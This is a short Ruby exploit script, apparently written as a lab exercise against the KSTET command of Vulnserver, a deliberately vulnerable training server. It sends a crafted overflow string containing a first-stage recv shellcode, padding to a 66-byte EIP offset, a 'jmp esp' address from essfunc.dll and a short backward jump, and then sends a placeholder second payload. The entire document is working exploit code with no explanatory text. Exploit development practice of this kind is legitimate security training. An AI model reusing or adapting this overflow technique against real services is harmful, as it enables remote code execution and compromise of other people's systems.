#!/usr/bin/ruby
require 'socket'

target = '192.168.1.121'
port = 9999

# call_recv.bin
first_stage = "\xcc\x50\x5c\x52\x80\xc6\x02\x52\x04\x40\x50\x53\xb8\x11\x2c\x25\x40\xc1\xe8\x08\xff\xd0"
#eip offset at 66
first_stage += "\xcc" * (66 - first_stage.length)
# 0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Documents and Settings\werebug\Desktop\Vulnserver\essfunc.dll)
first_stage += "\xaf\x11\x50\x62"
#nasm > jmp short -0x46
#00000000  EBB8              jmp short 0xffffffba
first_stage += "\xeb\xb8"
first_stage += "\x90" * 18

payload = "F" * 512

s = TCPSocket.open(target, port)
s.recv(1024)
s.puts('KSTET /.:/' + first_stage)
s.puts(payload)
s.close()
